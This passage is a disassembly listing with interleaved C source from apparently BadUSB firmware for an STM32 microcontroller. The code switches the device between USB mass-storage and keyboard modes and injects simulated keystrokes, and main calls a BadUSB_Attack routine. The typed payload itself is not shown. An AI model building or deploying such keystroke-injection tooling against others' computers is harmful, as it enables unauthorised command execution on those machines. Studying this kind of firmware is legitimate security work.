 8000628:	2b00      	cmp	r3, #0
 800062a:	d1fc      	bne.n	8000626 <main+0x9e>
				  SwitchToHID();
 800062c:	f000 f88a 	bl	8000744 <SwitchToHID>
				  BadUSB_Attack(1);
 8000630:	2001      	movs	r0, #1
 8000632:	f000 fa7d 	bl	8000b30 <BadUSB_Attack>
				  break;
 8000636:	bf00      	nop
		  flag = 0;
 8000638:	2300      	movs	r3, #0
 800063a:	607b      	str	r3, [r7, #4]
		  SwitchToMSC();
 800063c:	f000 f89a 	bl	8000774 <SwitchToMSC>
	  InterruptTrap(&InterruptFlag);
 8000640:	e7bd      	b.n	80005be <main+0x36>
 8000642:	bf00      	nop
 8000644:	20000978 	.word	0x20000978
 8000648:	2000025c 	.word	0x2000025c
 800064c:	20000270 	.word	0x20000270
 8000650:	40022000 	.word	0x40022000

08000654 <SystemClock_Config>:
/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void)
{
 8000654:	b580      	push	{r7, lr}
 8000656:	b096      	sub	sp, #88	; 0x58
 8000658:	af00      	add	r7, sp, #0
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
 800065a:	f107 0314 	add.w	r3, r7, #20
 800065e:	2244      	movs	r2, #68	; 0x44
 8000660:	2100      	movs	r1, #0
 8000662:	4618      	mov	r0, r3
 8000664:	f00c fce6 	bl	800d034 <memset>
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};
 8000668:	463b      	mov	r3, r7
 800066a:	2200      	movs	r2, #0
 800066c:	601a      	str	r2, [r3, #0]
 800066e:	605a      	str	r2, [r3, #4]
 8000670:	609a      	str	r2, [r3, #8]
 8000672:	60da      	str	r2, [r3, #12]
 8000674:	611a      	str	r2, [r3, #16]

  /** Configure the main internal regulator output voltage
  */
  if (HAL_PWREx_ControlVoltageScaling(PWR_REGULATOR_VOLTAGE_SCALE1) != HAL_OK)
 8000676:	f44f 7000 	mov.w	r0, #512	; 0x200
 800067a:	f003 f8e3 	bl	8003844 <HAL_PWREx_ControlVoltageScaling>
 800067e:	4603      	mov	r3, r0
 8000680:	2b00      	cmp	r3, #0
 8000682:	d001      	beq.n	8000688 <SystemClock_Config+0x34>
  {
    Error_Handler();
 8000684:	f000 fb28 	bl	8000cd8 <Error_Handler>
  }

  /** Configure LSE Drive Capability
  */
  HAL_PWR_EnableBkUpAccess();
 8000688:	f003 f8be 	bl	8003808 <HAL_PWR_EnableBkUpAccess>
  __HAL_RCC_LSEDRIVE_CONFIG(RCC_LSEDRIVE_LOW);
 800068c:	4b21      	ldr	r3, [pc, #132]	; (8000714 <SystemClock_Config+0xc0>)
 800068e:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8000692:	4a20      	ldr	r2, [pc, #128]	; (8000714 <SystemClock_Config+0xc0>)
 8000694:	f023 0318 	bic.w	r3, r3, #24
 8000698:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90

  /** Initializes the RCC Oscillators according to the specified parameters
  * in the RCC_OscInitTypeDef structure.
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_LSE|RCC_OSCILLATORTYPE_MSI;
 800069c:	2314      	movs	r3, #20
 800069e:	617b      	str	r3, [r7, #20]
  RCC_OscInitStruct.LSEState = RCC_LSE_ON;
 80006a0:	2301      	movs	r3, #1
 80006a2:	61fb      	str	r3, [r7, #28]
  RCC_OscInitStruct.MSIState = RCC_MSI_ON;
 80006a4:	2301      	movs	r3, #1
 80006a6:	62fb      	str	r3, [r7, #44]	; 0x2c
  RCC_OscInitStruct.MSICalibrationValue = 0;
 80006a8:	2300      	movs	r3, #0
 80006aa:	633b      	str	r3, [r7, #48]	; 0x30
  RCC_OscInitStruct.MSIClockRange = RCC_MSIRANGE_6;
 80006ac:	2360      	movs	r3, #96	; 0x60
 80006ae:	637b      	str	r3, [r7, #52]	; 0x34
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
 80006b0:	2302      	movs	r3, #2
 80006b2:	63fb      	str	r3, [r7, #60]	; 0x3c
  RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_MSI;
 80006b4:	2301      	movs	r3, #1
 80006b6:	643b      	str	r3, [r7, #64]	; 0x40
  RCC_OscInitStruct.PLL.PLLM = 1;
 80006b8:	2301      	movs	r3, #1
 80006ba:	647b      	str	r3, [r7, #68]	; 0x44
  RCC_OscInitStruct.PLL.PLLN = 24;
 80006bc:	2318      	movs	r3, #24
 80006be:	64bb      	str	r3, [r7, #72]	; 0x48
  RCC_OscInitStruct.PLL.PLLP = RCC_PLLP_DIV7;
 80006c0:	2307      	movs	r3, #7
 80006c2:	64fb      	str	r3, [r7, #76]	; 0x4c
  RCC_OscInitStruct.PLL.PLLQ = RCC_PLLQ_DIV2;
 80006c4:	2302      	movs	r3, #2
 80006c6:	653b      	str	r3, [r7, #80]	; 0x50
  RCC_OscInitStruct.PLL.PLLR = RCC_PLLR_DIV2;
 80006c8:	2302      	movs	r3, #2
 80006ca:	657b      	str	r3, [r7, #84]	; 0x54
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
 80006cc:	f107 0314 	add.w	r3, r7, #20
 80006d0:	4618      	mov	r0, r3
 80006d2:	f003 f91d 	bl	8003910 <HAL_RCC_OscConfig>
 80006d6:	4603      	mov	r3, r0
 80006d8:	2b00      	cmp	r3, #0
 80006da:	d001      	beq.n	80006e0 <SystemClock_Config+0x8c>
  {
    Error_Handler();
 80006dc:	f000 fafc 	bl	8000cd8 <Error_Handler>
  }

  /** Initializes the CPU, AHB and APB buses clocks
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
 80006e0:	230f      	movs	r3, #15
 80006e2:	603b      	str	r3, [r7, #0]
                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
 80006e4:	2303      	movs	r3, #3
 80006e6:	607b      	str	r3, [r7, #4]
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
 80006e8:	2300      	movs	r3, #0
 80006ea:	60bb      	str	r3, [r7, #8]
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV1;
 80006ec:	2300      	movs	r3, #0
 80006ee:	60fb      	str	r3, [r7, #12]
  RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;
 80006f0:	2300      	movs	r3, #0
 80006f2:	613b      	str	r3, [r7, #16]

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_2) != HAL_OK)
 80006f4:	463b      	mov	r3, r7
 80006f6:	2102      	movs	r1, #2
 80006f8:	4618      	mov	r0, r3
 80006fa:	f003 fd1d 	bl	8004138 <HAL_RCC_ClockConfig>
 80006fe:	4603      	mov	r3, r0
 8000700:	2b00      	cmp	r3, #0
 8000702:	d001      	beq.n	8000708 <SystemClock_Config+0xb4>
  {
    Error_Handler();
 8000704:	f000 fae8 	bl	8000cd8 <Error_Handler>
  }

  /** Enable MSI Auto calibration
  */
  HAL_RCCEx_EnableMSIPLLMode();
 8000708:	f004 f930 	bl	800496c <HAL_RCCEx_EnableMSIPLLMode>
}
 800070c:	bf00      	nop
 800070e:	3758      	adds	r7, #88	; 0x58
 8000710:	46bd      	mov	sp, r7
 8000712:	bd80      	pop	{r7, pc}
 8000714:	40021000 	.word	0x40021000

08000718 <SimulateUSB_unplug>:

/* USER CODE BEGIN 4 */
void SimulateUSB_unplug(){
 8000718:	b580      	push	{r7, lr}
 800071a:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_RESET);
 800071c:	2200      	movs	r2, #0
 800071e:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 8000722:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8000726:	f001 fa93 	bl	8001c50 <HAL_GPIO_WritePin>
}
 800072a:	bf00      	nop
 800072c:	bd80      	pop	{r7, pc}

0800072e <SimulateUSB_plugin>:

void SimulateUSB_plugin(){
 800072e:	b580      	push	{r7, lr}
 8000730:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_SET);
 8000732:	2201      	movs	r2, #1
 8000734:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 8000738:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 800073c:	f001 fa88 	bl	8001c50 <HAL_GPIO_WritePin>
}
 8000740:	bf00      	nop
 8000742:	bd80      	pop	{r7, pc}

08000744 <SwitchToHID>:

void SwitchToHID(){
 8000744:	b580      	push	{r7, lr}
 8000746:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 8000748:	f7ff ffe6 	bl	8000718 <SimulateUSB_unplug>
	isMSC = 0;
 800074c:	4b08      	ldr	r3, [pc, #32]	; (8000770 <SwitchToHID+0x2c>)
 800074e:	2200      	movs	r2, #0
 8000750:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 8000752:	2032      	movs	r0, #50	; 0x32
 8000754:	f000 fd64 	bl	8001220 <HAL_Delay>
	SimulateUSB_plugin();
 8000758:	f7ff ffe9 	bl	800072e <SimulateUSB_plugin>
	MX_TIM2_Init();
 800075c:	f000 fbb6 	bl	8000ecc <MX_TIM2_Init>
	MX_USB_DEVICE_Init();
 8000760:	f00b fe30 	bl	800c3c4 <MX_USB_DEVICE_Init>
	HAL_Delay(SwitchDeviceSlot);
 8000764:	f640 30b8 	movw	r0, #3000	; 0xbb8
 8000768:	f000 fd5a 	bl	8001220 <HAL_Delay>
}
 800076c:	bf00      	nop
 800076e:	bd80      	pop	{r7, pc}
 8000770:	20000978 	.word	0x20000978

08000774 <SwitchToMSC>:

void SwitchToMSC(){
 8000774:	b580      	push	{r7, lr}
 8000776:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 8000778:	f7ff ffce 	bl	8000718 <SimulateUSB_unplug>
	isMSC = 1;
 800077c:	4b07      	ldr	r3, [pc, #28]	; (800079c <SwitchToMSC+0x28>)
 800077e:	2201      	movs	r2, #1
 8000780:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 8000782:	2032      	movs	r0, #50	; 0x32
 8000784:	f000 fd4c 	bl	8001220 <HAL_Delay>
	SimulateUSB_plugin();
 8000788:	f7ff ffd1 	bl	800072e <SimulateUSB_plugin>
	MX_USB_DEVICE_Init_MSC();
 800078c:	f00b fe4a 	bl	800c424 <MX_USB_DEVICE_Init_MSC>
	HAL_Delay(SwitchDeviceSlot);
 8000790:	f640 30b8 	movw	r0, #3000	; 0xbb8
 8000794:	f000 fd44 	bl	8001220 <HAL_Delay>
}
 8000798:	bf00      	nop
 800079a:	bd80      	pop	{r7, pc}
 800079c:	20000978 	.word	0x20000978

080007a0 <Get_Single_Descriptor>:

void Get_Single_Descriptor(uint8_t ascii){
 80007a0:	b580      	push	{r7, lr}
 80007a2:	b0a4      	sub	sp, #144	; 0x90
 80007a4:	af00      	add	r7, sp, #0
 80007a6:	4603      	mov	r3, r0
 80007a8:	71fb      	strb	r3, [r7, #7]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80007aa:	220f      	movs	r2, #15
 80007ac:	2100      	movs	r1, #0
 80007ae:	4821      	ldr	r0, [pc, #132]	; (8000834 <Get_Single_Descriptor+0x94>)
 80007b0:	f00c fc40 	bl	800d034 <memset>
	uint8_t Map[MapLen] = Map_Init;
 80007b4:	4a20      	ldr	r2, [pc, #128]	; (8000838 <Get_Single_Descriptor+0x98>)
 80007b6:	f107 0308 	add.w	r3, r7, #8
 80007ba:	4611      	mov	r1, r2
 80007bc:	2286      	movs	r2, #134	; 0x86
 80007be:	4618      	mov	r0, r3
 80007c0:	f00c fc64 	bl	800d08c <memcpy>
	Convert2CapsMap(Map);
 80007c4:	f107 0308 	add.w	r3, r7, #8
 80007c8:	4618      	mov	r0, r3
 80007ca:	f000 f93f 	bl	8000a4c <Convert2CapsMap>
	uint8_t pos = Map[ascii];
 80007ce:	79fb      	ldrb	r3, [r7, #7]
 80007d0:	3390      	adds	r3, #144	; 0x90
 80007d2:	443b      	add	r3, r7
 80007d4:	f813 3c88 	ldrb.w	r3, [r3, #-136]
 80007d8:	f887 308f 	strb.w	r3, [r7, #143]	; 0x8f
	sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 80007dc:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007e0:	091b      	lsrs	r3, r3, #4
 80007e2:	b2db      	uxtb	r3, r3
 80007e4:	461a      	mov	r2, r3
 80007e6:	4b13      	ldr	r3, [pc, #76]	; (8000834 <Get_Single_Descriptor+0x94>)
 80007e8:	5c9b      	ldrb	r3, [r3, r2]
 80007ea:	b25a      	sxtb	r2, r3
 80007ec:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007f0:	f003 0307 	and.w	r3, r3, #7
 80007f4:	2101      	movs	r1, #1
 80007f6:	fa01 f303 	lsl.w	r3, r1, r3
 80007fa:	b25b      	sxtb	r3, r3
 80007fc:	4313      	orrs	r3, r2
 80007fe:	b259      	sxtb	r1, r3
 8000800:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 8000804:	091b      	lsrs	r3, r3, #4
 8000806:	b2db      	uxtb	r3, r3
 8000808:	461a      	mov	r2, r3
 800080a:	b2c9      	uxtb	r1, r1
 800080c:	4b09      	ldr	r3, [pc, #36]	; (8000834 <Get_Single_Descriptor+0x94>)
 800080e:	5499      	strb	r1, [r3, r2]
	if((pos&0x08) == 8)
 8000810:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 8000814:	f003 0308 	and.w	r3, r3, #8
 8000818:	2b00      	cmp	r3, #0
 800081a:	d006      	beq.n	800082a <Get_Single_Descriptor+0x8a>
		sent_buffer[0] |= 0x02;
 800081c:	4b05      	ldr	r3, [pc, #20]	; (8000834 <Get_Single_Descriptor+0x94>)
 800081e:	781b      	ldrb	r3, [r3, #0]
 8000820:	f043 0302 	orr.w	r3, r3, #2
 8000824:	b2da      	uxtb	r2, r3
 8000826:	4b03      	ldr	r3, [pc, #12]	; (8000834 <Get_Single_Descriptor+0x94>)
 8000828:	701a      	strb	r2, [r3, #0]
}
 800082a:	bf00      	nop
 800082c:	3790      	adds	r7, #144	; 0x90
 800082e:	46bd      	mov	sp, r7
 8000830:	bd80      	pop	{r7, pc}
 8000832:	bf00      	nop
 8000834:	2000025c 	.word	0x2000025c
 8000838:	0800d0c0 	.word	0x0800d0c0

0800083c <Get_Multi_Descriptor>:

/*Designed for shortcut key combinations to obtain data packets:
 * for simultaneously pressing multiple keys*/
void Get_Multi_Descriptor(uint8_t *array, int num){
 800083c:	b580      	push	{r7, lr}
 800083e:	b0a6      	sub	sp, #152	; 0x98
 8000840:	af00      	add	r7, sp, #0
 8000842:	6078      	str	r0, [r7, #4]
 8000844:	6039      	str	r1, [r7, #0]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000846:	220f      	movs	r2, #15
 8000848:	2100      	movs	r1, #0
 800084a:	482a      	ldr	r0, [pc, #168]	; (80008f4 <Get_Multi_Descriptor+0xb8>)
 800084c:	f00c fbf2 	bl	800d034 <memset>
	uint8_t Map[MapLen] = Map_Init;
 8000850:	4a29      	ldr	r2, [pc, #164]	; (80008f8 <Get_Multi_Descriptor+0xbc>)
 8000852:	f107 030c 	add.w	r3, r7, #12
 8000856:	4611      	mov	r1, r2
 8000858:	2286      	movs	r2, #134	; 0x86
 800085a:	4618      	mov	r0, r3
 800085c:	f00c fc16 	bl	800d08c <memcpy>
	Convert2CapsMap(Map);
 8000860:	f107 030c 	add.w	r3, r7, #12
 8000864:	4618      	mov	r0, r3
 8000866:	f000 f8f1 	bl	8000a4c <Convert2CapsMap>
	for(int i = 0; i < num; i++){
 800086a:	2300      	movs	r3, #0
 800086c:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 8000870:	e036      	b.n	80008e0 <Get_Multi_Descriptor+0xa4>
		uint8_t pos = Map[array[i]];
 8000872:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 8000876:	687a      	ldr	r2, [r7, #4]
 8000878:	4413      	add	r3, r2
 800087a:	781b      	ldrb	r3, [r3, #0]
 800087c:	3398      	adds	r3, #152	; 0x98
 800087e:	443b      	add	r3, r7
 8000880:	f813 3c8c 	ldrb.w	r3, [r3, #-140]
 8000884:	f887 3093 	strb.w	r3, [r7, #147]	; 0x93
		sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 8000888:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 800088c:	091b      	lsrs	r3, r3, #4
 800088e:	b2db      	uxtb	r3, r3
 8000890:	461a      	mov	r2, r3
 8000892:	4b18      	ldr	r3, [pc, #96]	; (80008f4 <Get_Multi_Descriptor+0xb8>)
 8000894:	5c9b      	ldrb	r3, [r3, r2]
 8000896:	b25a      	sxtb	r2, r3
 8000898:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 800089c:	f003 0307 	and.w	r3, r3, #7
 80008a0:	2101      	movs	r1, #1
 80008a2:	fa01 f303 	lsl.w	r3, r1, r3
 80008a6:	b25b      	sxtb	r3, r3
 80008a8:	4313      	orrs	r3, r2
 80008aa:	b259      	sxtb	r1, r3
 80008ac:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 80008b0:	091b      	lsrs	r3, r3, #4
 80008b2:	b2db      	uxtb	r3, r3
 80008b4:	461a      	mov	r2, r3
 80008b6:	b2c9      	uxtb	r1, r1
 80008b8:	4b0e      	ldr	r3, [pc, #56]	; (80008f4 <Get_Multi_Descriptor+0xb8>)
 80008ba:	5499      	strb	r1, [r3, r2]
		if((pos&0x08) == 8)
 80008bc:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 80008c0:	f003 0308 	and.w	r3, r3, #8
 80008c4:	2b00      	cmp	r3, #0
 80008c6:	d006      	beq.n	80008d6 <Get_Multi_Descriptor+0x9a>
			sent_buffer[0] |= 0x02;
 80008c8:	4b0a      	ldr	r3, [pc, #40]	; (80008f4 <Get_Multi_Descriptor+0xb8>)
 80008ca:	781b      	ldrb	r3, [r3, #0]
 80008cc:	f043 0302 	orr.w	r3, r3, #2
 80008d0:	b2da      	uxtb	r2, r3
 80008d2:	4b08      	ldr	r3, [pc, #32]	; (80008f4 <Get_Multi_Descriptor+0xb8>)
 80008d4:	701a      	strb	r2, [r3, #0]
	for(int i = 0; i < num; i++){
 80008d6:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 80008da:	3301      	adds	r3, #1
 80008dc:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 80008e0:	f8d7 2094 	ldr.w	r2, [r7, #148]	; 0x94
 80008e4:	683b      	ldr	r3, [r7, #0]
 80008e6:	429a      	cmp	r2, r3
 80008e8:	dbc3      	blt.n	8000872 <Get_Multi_Descriptor+0x36>
	}
}
 80008ea:	bf00      	nop
 80008ec:	bf00      	nop
 80008ee:	3798      	adds	r7, #152	; 0x98
 80008f0:	46bd      	mov	sp, r7
 80008f2:	bd80      	pop	{r7, pc}
 80008f4:	2000025c 	.word	0x2000025c
 80008f8:	0800d0c0 	.word	0x0800d0c0

080008fc <SimulateKeyPress>:

void SimulateKeyPress(uint8_t ascii){
 80008fc:	b580      	push	{r7, lr}
 80008fe:	b082      	sub	sp, #8
 8000900:	af00      	add	r7, sp, #0
 8000902:	4603      	mov	r3, r0
 8000904:	71fb      	strb	r3, [r7, #7]
	//get key:ascii Descriptor
	Get_Single_Descriptor(ascii);
 8000906:	79fb      	ldrb	r3, [r7, #7]
 8000908:	4618      	mov	r0, r3
 800090a:	f7ff ff49 	bl	80007a0 <Get_Single_Descriptor>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800090e:	220f      	movs	r2, #15
 8000910:	4903      	ldr	r1, [pc, #12]	; (8000920 <SimulateKeyPress+0x24>)
 8000912:	4804      	ldr	r0, [pc, #16]	; (8000924 <SimulateKeyPress+0x28>)
 8000914:	f008 f894 	bl	8008a40 <USBD_CUSTOM_HID_SendReport>
}
 8000918:	bf00      	nop
 800091a:	3708      	adds	r7, #8
 800091c:	46bd      	mov	sp, r7
 800091e:	bd80      	pop	{r7, pc}
 8000920:	2000025c 	.word	0x2000025c
 8000924:	200003c0 	.word	0x200003c0

08000928 <SimulateKeyRelease>:

void SimulateKeyRelease(){
 8000928:	b580      	push	{r7, lr}
 800092a:	af00      	add	r7, sp, #0
	//set 0
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800092c:	220f      	movs	r2, #15
 800092e:	2100      	movs	r1, #0
 8000930:	4804      	ldr	r0, [pc, #16]	; (8000944 <SimulateKeyRelease+0x1c>)
 8000932:	f00c fb7f 	bl	800d034 <memset>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000936:	220f      	movs	r2, #15
 8000938:	4902      	ldr	r1, [pc, #8]	; (8000944 <SimulateKeyRelease+0x1c>)
 800093a:	4803      	ldr	r0, [pc, #12]	; (8000948 <SimulateKeyRelease+0x20>)
 800093c:	f008 f880 	bl	8008a40 <USBD_CUSTOM_HID_SendReport>
}
 8000940:	bf00      	nop
 8000942:	bd80      	pop	{r7, pc}
 8000944:	2000025c 	.word	0x2000025c
 8000948:	200003c0 	.word	0x200003c0

0800094c <SimulateKeyStroke>:

void SimulateKeyStroke(uint8_t ascii){
 800094c:	b580      	push	{r7, lr}
 800094e:	b082      	sub	sp, #8
 8000950:	af00      	add	r7, sp, #0
 8000952:	4603      	mov	r3, r0
 8000954:	71fb      	strb	r3, [r7, #7]
	SimulateKeyPress(ascii);
 8000956:	79fb      	ldrb	r3, [r7, #7]
 8000958:	4618      	mov	r0, r3
 800095a:	f7ff ffcf 	bl	80008fc <SimulateKeyPress>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 800095e:	2023      	movs	r0, #35	; 0x23
 8000960:	f000 fc5e 	bl	8001220 <HAL_Delay>
	SimulateKeyRelease();
 8000964:	f7ff ffe0 	bl	8000928 <SimulateKeyRelease>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 8000968:	2023      	movs	r0, #35	; 0x23
 800096a:	f000 fc59 	bl	8001220 <HAL_Delay>
}
 800096e:	bf00      	nop
 8000970:	3708      	adds	r7, #8
 8000972:	46bd      	mov	sp, r7
 8000974:	bd80      	pop	{r7, pc}
	...

08000978 <SimulateShortcutKey>:

void SimulateShortcutKey(uint8_t *array, int num){
 8000978:	b580      	push	{r7, lr}
 800097a:	b082      	sub	sp, #8
 800097c:	af00      	add	r7, sp, #0
 800097e:	6078      	str	r0, [r7, #4]
 8000980:	6039      	str	r1, [r7, #0]
	Get_Multi_Descriptor(array, num);
 8000982:	6839      	ldr	r1, [r7, #0]
 8000984:	6878      	ldr	r0, [r7, #4]
 8000986:	f7ff ff59 	bl	800083c <Get_Multi_Descriptor>
	while((recv_buffer[0]&0x02) != 0x02){
 800098a:	e002      	b.n	8000992 <SimulateShortcutKey+0x1a>
		SimulateKeyStroke(128);
 800098c:	2080      	movs	r0, #128	; 0x80
 800098e:	f7ff ffdd 	bl	800094c <SimulateKeyStroke>
	while((recv_buffer[0]&0x02) != 0x02){
 8000992:	4b0c      	ldr	r3, [pc, #48]	; (80009c4 <SimulateShortcutKey+0x4c>)
 8000994:	781b      	ldrb	r3, [r3, #0]
 8000996:	f003 0302 	and.w	r3, r3, #2
 800099a:	2b00      	cmp	r3, #0
 800099c:	d0f6      	beq.n	800098c <SimulateShortcutKey+0x14>
	}
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800099e:	220f      	movs	r2, #15
 80009a0:	4909      	ldr	r1, [pc, #36]	; (80009c8 <SimulateShortcutKey+0x50>)
 80009a2:	480a      	ldr	r0, [pc, #40]	; (80009cc <SimulateShortcutKey+0x54>)
 80009a4:	f008 f84c 	bl	8008a40 <USBD_CUSTOM_HID_SendReport>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 80009a8:	2023      	movs	r0, #35	; 0x23
 80009aa:	f000 fc39 	bl	8001220 <HAL_Delay>
	SimulateKeyRelease();
 80009ae:	f7ff ffbb 	bl	8000928 <SimulateKeyRelease>
	HAL_Delay(ShortcutSlot); //Wait to avoid conflict
 80009b2:	f44f 707a 	mov.w	r0, #1000	; 0x3e8
 80009b6:	f000 fc33 	bl	8001220 <HAL_Delay>
}
 80009ba:	bf00      	nop
 80009bc:	3708      	adds	r7, #8
 80009be:	46bd      	mov	sp, r7
 80009c0:	bd80      	pop	{r7, pc}
 80009c2:	bf00      	nop
 80009c4:	2000026c 	.word	0x2000026c
 80009c8:	2000025c 	.word	0x2000025c
 80009cc:	200003c0 	.word	0x200003c0

080009d0 <SimulateKeyStrokes>:

void SimulateKeyStrokes(char *str, int len, int *cntNow){
 80009d0:	b580      	push	{r7, lr}
 80009d2:	b084      	sub	sp, #16
 80009d4:	af00      	add	r7, sp, #0
 80009d6:	60f8      	str	r0, [r7, #12]
 80009d8:	60b9      	str	r1, [r7, #8]
 80009da:	607a      	str	r2, [r7, #4]
	for(*cntNow = 0; *cntNow < len; (*cntNow)++){
 80009dc:	687b      	ldr	r3, [r7, #4]
 80009de:	2200      	movs	r2, #0
 80009e0:	601a      	str	r2, [r3, #0]
 80009e2:	e025      	b.n	8000a30 <SimulateKeyStrokes+0x60>
    	//Ensure func SimulateKeyStroke is executed in uppercase environment.
		if((recv_buffer[0]&0x02) != 0x02){
 80009e4:	4b17      	ldr	r3, [pc, #92]	; (8000a44 <SimulateKeyStrokes+0x74>)
 80009e6:	781b      	ldrb	r3, [r3, #0]
 80009e8:	f003 0302 	and.w	r3, r3, #2
 80009ec:	2b00      	cmp	r3, #0
 80009ee:	d102      	bne.n	80009f6 <SimulateKeyStrokes+0x26>
			SimulateKeyStroke(128);
 80009f0:	2080      	movs	r0, #128	; 0x80
 80009f2:	f7ff ffab 	bl	800094c <SimulateKeyStroke>
    	}
		SimulateKeyStroke(str[*cntNow]);
 80009f6:	687b      	ldr	r3, [r7, #4]
 80009f8:	681b      	ldr	r3, [r3, #0]
 80009fa:	461a      	mov	r2, r3
 80009fc:	68fb      	ldr	r3, [r7, #12]
 80009fe:	4413      	add	r3, r2
 8000a00:	781b      	ldrb	r3, [r3, #0]
 8000a02:	4618      	mov	r0, r3
 8000a04:	f7ff ffa2 	bl	800094c <SimulateKeyStroke>
		//Determine if RollBack is necessary
		if(NeedRollBack == 1){
 8000a08:	4b0f      	ldr	r3, [pc, #60]	; (8000a48 <SimulateKeyStrokes+0x78>)
 8000a0a:	681b      	ldr	r3, [r3, #0]
 8000a0c:	2b01      	cmp	r3, #1
 8000a0e:	d10a      	bne.n	8000a26 <SimulateKeyStrokes+0x56>
			NeedRollBack = 0;
 8000a10:	4b0d      	ldr	r3, [pc, #52]	; (8000a48 <SimulateKeyStrokes+0x78>)
 8000a12:	2200      	movs	r2, #0
 8000a14:	601a      	str	r2, [r3, #0]
			(*cntNow)--;
 8000a16:	687b      	ldr	r3, [r7, #4]
 8000a18:	681b      	ldr	r3, [r3, #0]
 8000a1a:	1e5a      	subs	r2, r3, #1
 8000a1c:	687b      	ldr	r3, [r7, #4]
 8000a1e:	601a      	str	r2, [r3, #0]
			SimulateKeyStroke(129);
 8000a20:	2081      	movs	r0, #129	; 0x81
 8000a22:	f7ff ff93 	bl	800094c <SimulateKeyStroke>
	for(*cntNow = 0; *cntNow < len; (*cntNow)++){
 8000a26:	687b      	ldr	r3, [r7, #4]
 8000a28:	681b      	ldr	r3, [r3, #0]
 8000a2a:	1c5a      	adds	r2, r3, #1
 8000a2c:	687b      	ldr	r3, [r7, #4]
 8000a2e:	601a      	str	r2, [r3, #0]
 8000a30:	687b      	ldr	r3, [r7, #4]
 8000a32:	681b      	ldr	r3, [r3, #0]
 8000a34:	68ba      	ldr	r2, [r7, #8]
 8000a36:	429a      	cmp	r2, r3
 8000a38:	dcd4      	bgt.n	80009e4 <SimulateKeyStrokes+0x14>
		}
	}
}
 8000a3a:	bf00      	nop
 8000a3c:	bf00      	nop
 8000a3e:	3710      	adds	r7, #16
 8000a40:	46bd      	mov	sp, r7
 8000a42:	bd80      	pop	{r7, pc}
 8000a44:	2000026c 	.word	0x2000026c
 8000a48:	2000027c 	.word	0x2000027c

08000a4c <Convert2CapsMap>:
		SimulateKeyStroke(128);
		PrintRecvBuf(recv_buffer);  //print Keyboard LED Status
	}
}

void Convert2CapsMap(uint8_t LowerCaseMap[MapLen]){
 8000a4c:	b480      	push	{r7}
 8000a4e:	b085      	sub	sp, #20
 8000a50:	af00      	add	r7, sp, #0
 8000a52:	6078      	str	r0, [r7, #4]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 8000a54:	2341      	movs	r3, #65	; 0x41
 8000a56:	73fb      	strb	r3, [r7, #15]
 8000a58:	e01a      	b.n	8000a90 <Convert2CapsMap+0x44>
		LowerCaseMap[cnt] &= 0xf7;
 8000a5a:	7bfb      	ldrb	r3, [r7, #15]
